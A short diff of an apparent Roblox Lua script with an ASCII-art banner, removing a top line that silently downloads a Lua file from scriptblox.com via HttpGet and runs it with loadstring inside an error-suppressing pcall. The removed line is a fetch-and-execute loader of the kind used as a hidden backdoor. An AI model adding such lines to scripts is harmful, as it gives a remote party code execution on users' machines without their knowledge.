@@ -1,4 +1,4 @@
-pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_1d5a9fe96c01", "1.0.0", false) end)
+
 --[[
  ____                 _                 __        __        _     _          
 |  _ \ ___ _ __ _ __ | | _____  __      \ \      / /_ _ ___| |__ (_) ___ ____
